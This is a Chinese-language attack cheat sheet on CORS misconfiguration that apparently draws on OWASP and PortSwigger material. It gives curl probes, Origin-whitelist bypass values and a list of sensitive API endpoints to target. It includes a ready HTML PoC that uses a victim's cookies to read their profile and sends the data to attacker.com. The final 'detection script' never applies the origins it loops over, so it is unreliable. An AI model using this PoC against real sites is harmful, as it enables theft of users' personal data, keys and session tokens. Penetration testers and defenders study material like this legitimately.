# CORS 跨域配置错误实战参考

> 阶段分离: [攻击] 检测CORS配置 → [利用] 窃取敏感数据/CSRF增强

---

# 攻击阶段 — 检测

## 1. 识别 CORS 配置

### 1.1 基础检测

```bash
# 正常跨域请求 (无CORS):
curl -H "Origin: https://evil.com" https://target.com/api/user/profile -I
# → 无 Access-Control-Allow-Origin → 安全

# 错误配置:
curl -H "Origin: https://evil.com" https://target.com/api/user/profile -I
# → Access-Control-Allow-Origin: https://evil.com ← ★ 危险!!!

# 万能通配:
curl -H "Origin: https://evil.com" https://target.com/api/user/profile -I
# → Access-Control-Allow-Origin: * ← ★ 更危险!!!
```

### 1.2 检查 CORS 头组合

```bash
# === 看 Origin 是反射还是固定 ===
curl -H "Origin: https://evil.com" https://target.com/api/profile -I
# Access-Control-Allow-Origin: https://evil.com → 反射型, 危险

# === 看 credentials 支持 ===
curl -H "Origin: https://evil.com" https://target.com/api/profile -I
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true ← ★ 带凭据的跨域!!!

# === 危险组合 ===
# Allow-Origin: 反射Origin + Allow-Credentials: true
# → 可以带Cookie发起跨域请求!!!
```

### 1.3 绕过 Origin 白名单

```bash
# 如果白名单是 target.com:
Origin: https://target.com          → 通过
Origin: https://evil.target.com     → 通过? 子域名劫持!
Origin: https://target.com.evil.com → 通过? 后缀匹配!
Origin: https://target.com@evil.com → 通过? URL解析差异!

# 如果白名单是 *.target.com:
# → 任意子域名 (找XSS/子域接管)

# 如果白名单检查仅前缀:
Origin: https://target.com.evil.com → 通过 → 多级子域

# 大小写绕过:
Origin: https://Target.com → 通过

# null Origin:
Origin: null → 可能通过 (sandboxed iframe/文件)
```

---

# 利用阶段 — 武器化

## 2. CORS 窃取数据 PoC

```html
<!-- exploit.html (托管在 attacker.com) -->
<script>
var req = new XMLHttpRequest();
req.onload = function() {
  // 外带数据
  document.location='http://attacker.com/steal?data='+btoa(this.responseText);
};
req.open('GET', 'https://target.com/api/user/profile', true);
req.withCredentials = true;   // ★ 带Cookie
req.send();
</script>
```

## 3. 常用敏感接口

```
/api/user/profile        → 用户详情
/api/user/orders         → 订单
/api/admin/users         → 用户列表
/api/settings            → 配置
/api/keys                → API密钥
/api/tokens              → 认证令牌
/api/session             → 会话信息
```

## 4. 检测脚本

```javascript
// 浏览器F12 Console:
var domains = ['https://evil.com','https://null','null','https://target.com.evil.com'];
var testURL = 'https://target.com/api/user/profile';
domains.forEach(function(o) {
  fetch(testURL, {credentials: 'include'})
    .then(r => r.text())
    .then(d => {
      if (d.includes('sensitive_keyword')) {
        console.log('[+] CORS VULN with Origin: ' + o);
      }
    });
});
```

---

*参考: OWASP CORS + PortSwigger CORS + 实战案例*
